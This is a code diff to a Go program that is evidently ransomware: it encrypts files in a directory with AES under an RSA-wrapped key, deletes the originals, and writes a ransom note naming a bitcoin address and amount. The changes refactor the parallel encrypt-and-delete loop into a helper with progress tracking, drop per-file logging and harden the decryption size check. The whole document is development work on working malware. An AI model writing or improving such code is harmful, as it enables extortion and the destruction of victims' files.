@@ -38,6 +38,46 @@ func loadPrivateKey(path string) (*rsa.PrivateKey, error) {
 	return crypto.ParseRsaPrivateKeyFromPemStr(pem)
 }
 
+// fileSize returns the size of the file at path, or 0 if it cannot be determined.
+func fileSize(path string) int64 {
+	info, err := os.Stat(path)
+	if err != nil {
+		return 0
+	}
+	return info.Size()
+}
+
+// processFiles applies operate to each file using parallel workers with progress
+// tracking. Unless dryRun is set, originals are deleted after a successful operation.
+func processFiles(files []string, workers int, dryRun bool, label string, operate func(path string) error) error {
+	if len(files) == 0 {
+		fmt.Fprintf(os.Stderr, "No files found for %s\n", strings.ToLower(label))
+		return nil
+	}
+
+	progress := NewProgress(label, len(files))
+
+	err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
+		size := fileSize(filePath)
+
+		if err := operate(filePath); err != nil {
+			return fmt.Errorf("%s: %w", filePath, err)
+		}
+
+		if !dryRun {
+			if err := fs.DeleteFileIfExists(filePath); err != nil {
+				return fmt.Errorf("delete %s: %w", filePath, err)
+			}
+		}
+
+		progress.Tick(filePath, size)
+		return nil
+	})
+
+	progress.Summary(err != nil)
+	return err
+}
+
 func Encrypt(ctx *urfavecli.Context) error {
 	path := ctx.String("path")
 	publicKeyPath := ctx.String("publicKey")
@@ -100,14 +140,8 @@ func Encrypt(ctx *urfavecli.Context) error {
 		return err
 	}
 
-	if err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
-		if err := encryptFile(filePath, plainAesKey, encryptedAesKey, encSuffix); err != nil {
-			return err
-		}
-		if !dryRun {
-			return fs.DeleteFileIfExists(filePath)
-		}
-		return nil
+	if err := processFiles(files, workers, dryRun, "Encrypting", func(filePath string) error {
+		return encryptFile(filePath, plainAesKey, encryptedAesKey, encSuffix)
 	}); err != nil {
 		return err
 	}
@@ -155,19 +189,16 @@ func Decrypt(ctx *urfavecli.Context) error {
 		return err
 	}
 
-	if err := fs.ProcessFilesParallel(files, workers, func(filePath string) error {
-		if err := decryptFile(filePath, rsaPrivateKey, encSuffix); err != nil {
-			return err
-		}
-		if !dryRun {
-			return fs.DeleteFileIfExists(filePath)
-		}
-		return nil
+	if err := processFiles(files, workers, dryRun, "Decrypting", func(filePath string) error {
+		return decryptFile(filePath, rsaPrivateKey, encSuffix)
 	}); err != nil {
 		return err
 	}
 
-	return fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
+	if !dryRun {
+		return fs.DeleteFileIfExists(filepath.Join(absolutePath, ransomFileName))
+	}
+	return nil
 }
 
 func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKey, bitcoinAddress string, bitcoinCount float64) error {
@@ -210,8 +241,6 @@ func writeRansomNote(dir, fileName, templatePath string, publicKey *rsa.PublicKe
 }
 
 func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encSuffix string) error {
-	log.Printf("Encrypting %s", path)
-
 	plainText, err := os.ReadFile(path)
 	if err != nil {
 		return err
@@ -222,6 +251,7 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encS
 		return err
 	}
 
+	// Allocate a new slice to avoid mutating the shared encryptedAesKey.
 	fileContent := make([]byte, 0, len(encryptedAesKey)+len(cipherText))
 	fileContent = append(fileContent, encryptedAesKey...)
 	fileContent = append(fileContent, cipherText...)
@@ -229,15 +259,16 @@ func encryptFile(path string, aesKey crypto.AesKey, encryptedAesKey []byte, encS
 }
 
 func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) error {
-	log.Printf("Decrypting %s", path)
-
 	cipherText, err := os.ReadFile(path)
 	if err != nil {
 		return err
 	}
 
 	keySize := rsaPrivateKey.Size()
-	if len(cipherText) <= keySize {
+	// AES-GCM ciphertext must contain at least a 12-byte nonce and a 16-byte
+	// authentication tag in addition to the RSA-encrypted key prefix.
+	const minAESGCMOverhead = 12 + 16 // nonce + tag
+	if len(cipherText) < keySize+minAESGCMOverhead {
 		return fmt.Errorf("file too small to be a valid encrypted file: %s", path)
 	}
 
@@ -246,12 +277,12 @@ func decryptFile(path string, rsaPrivateKey *rsa.PrivateKey, encSuffix string) e
 		return err
 	}
 
-	plaintext, err := crypto.AesDecrypt(cipherText[keySize:], aesKey)
+	plainText, err := crypto.AesDecrypt(cipherText[keySize:], aesKey)
 	if err != nil {
 		return err
 	}
 
-	return fs.WriteToFile(strings.TrimSuffix(path, encSuffix), plaintext)
+	return fs.WriteToFile(strings.TrimSuffix(path, encSuffix), plainText)
 }
 
 // splitCommaSeparated splits a comma-separated string into a slice.
